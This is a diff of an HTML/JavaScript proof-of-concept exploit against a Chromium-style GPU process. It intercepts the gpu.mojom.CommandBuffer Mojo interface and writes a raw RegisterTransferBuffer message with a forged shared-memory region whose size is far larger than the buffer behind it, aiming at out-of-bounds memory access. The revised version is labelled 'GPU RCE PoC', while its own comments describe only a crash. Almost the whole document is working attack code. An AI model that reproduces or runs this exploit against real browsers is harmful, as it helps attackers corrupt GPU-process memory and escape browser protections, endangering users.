@@ -1,74 +1,64 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>RegisterTransferBuffer OOB PoC – Reliable</title>
+    <title>RegisterTransferBuffer OOB PoC</title>
 </head>
 <body>
-    <h1>Reliable GPU Crash</h1>
-    <p id="log"></p>
+    <h1>GPU RCE PoC</h1>
+    <p id="status">Starting...</p>
     <script>
     (async function() {
-        const log = (msg) => {
-            document.getElementById('log').innerText += msg + '\n';
+        const status = (msg) => {
+            document.getElementById('status').innerText = msg;
             console.log(msg);
         };
-
         try {
-            // 1. Intercept the CommandBuffer pipe
+            // 1. Intercept the gpu.mojom.CommandBuffer request
             const interceptor = new MojoInterfaceInterceptor('gpu.mojom.CommandBuffer', 'process');
             interceptor.oninterfacerequest = (e) => {
                 interceptor.stop();
                 const remote = new gpu.mojom.CommandBufferPtr(e.handle);
 
-                // --- STEP 1: Register the corrupted transfer buffer (ordinal 4) ---
-                let payload = new ArrayBuffer(256);
-                let view = new DataView(payload);
+                // 2. Craft the malicious RegisterTransferBuffer message (ordinal 4)
+                const payload = new ArrayBuffer(256);
+                const view = new DataView(payload);
+
                 // RegisterTransferBuffer_Params_Data (24 bytes)
-                view.setUint32(0, 24, true);
-                view.setUint32(4, 0, true);
-                view.setInt32(8, 0x1234, true);       // Buffer ID
-                view.setUint32(12, 0, true);           // padding
-                // Pointer to fake SharedMemoryRegion
-                view.setBigInt64(16, BigInt(0x40 - 0x10), true);
+                view.setUint32(0, 24, true);          // struct size
+                view.setUint32(4, 0, true);           // version
+                view.setInt32(8, 0x1234, true);       // buffer ID (non-zero)
+                view.setUint32(12, 0, true);          // padding
+                // Pointer to fake SharedMemoryRegion (relative offset)
+                const regionOffset = 0x40 - 0x10;
+                view.setBigInt64(16, BigInt(regionOffset), true);
 
                 // Fake SharedMemoryRegion at offset 0x40
-                view.setUint32(0x40, 24, true);
-                view.setUint32(0x44, 0, true);
-                view.setUint32(0x48, 0, true);         // handle index 0
-                view.setUint32(0x4C, 0, true);
-                // Huge size (e.g., 0x1000 = 4096, but the real buffer is 4 KB, so we can use
-                // a size slightly larger to guarantee OOB when accessed)
-                view.setBigUint64(0x50, BigInt(0x1001), true); // 4097 bytes → OOB
+                view.setUint32(0x40, 24, true);       // struct size
+                view.setUint32(0x44, 0, true);        // version
+                view.setUint32(0x48, 0, true);        // handle index (0)
+                view.setUint32(0x4C, 0, true);        // padding
+                view.setBigUint64(0x50, BigInt(0x100000000), true); // huge size
 
+                // Attach a valid small shared buffer (4 KB)
                 const sharedBuffer = Mojo.createSharedBuffer(4096);
                 const handles = [sharedBuffer.handle];
-                remote.ptr.getHandle().writeMessage(payload, handles);
-                log('Sent RegisterTransferBuffer (id=0x1234)');
 
-                // --- STEP 2: Force the GPU to use that buffer via SetGetBuffer (ordinal 1) ---
-                // SetGetBuffer_Params_Data: struct { int32 shm_id; }
-                payload = new ArrayBuffer(16);
-                view = new DataView(payload);
-                view.setUint32(0, 16, true);       // struct size
-                view.setUint32(4, 0, true);        // version
-                view.setInt32(8, 0x1234, true);    // buffer ID (must match!)
-                // No handles needed for this message
-                remote.ptr.getHandle().writeMessage(payload, []);
-                log('Sent SetGetBuffer (id=0x1234)');
-
-                // At this point, the GPU process will try to use the corrupted buffer
-                // and crash with STATUS_STACK_BUFFER_OVERRUN.
-                log('Exploit sent – GPU process should crash now.');
+                // 3. Send the raw message directly on the pipe
+                Mojo.writeMessage(remote.ptr.getHandle(), payload, handles);
+                status('Malicious RegisterTransferBuffer sent!');
             };
             interceptor.start();
 
-            // Create WebGL context to trigger command buffer creation
+            // 4. Create a WebGL context to trigger CommandBuffer creation
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
             if (!gl) throw new Error('WebGL not available');
+
+            // Wait briefly for the interceptor to fire
             await new Promise(resolve => setTimeout(resolve, 1000));
+            status('If no message appears, check the GPU process for a crash.');
         } catch (err) {
-            log('Error: ' + err.message);
+            status('Error: ' + err.message + ' (see console)');
             console.error(err);
         }
     })();
